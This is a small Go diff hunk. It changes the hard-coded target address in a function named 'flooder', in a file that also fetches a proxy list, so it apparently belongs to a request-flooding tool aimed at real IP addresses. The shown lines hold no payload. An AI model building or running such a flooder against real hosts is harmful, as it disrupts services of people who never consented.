@@ -52,7 +52,7 @@ func fetchProxyList() []string {
 }
 
 func flooder() {
-	url := "http://50.7.232.90" // Replace with your API endpoint
+	url :=  "http://91.193.113.71" // Replace with your API endpoint
 	uid, err := uuid.NewUUID()
 	if err != nil {
 		fmt.Printf("Error generating UUID: %s\n", err)
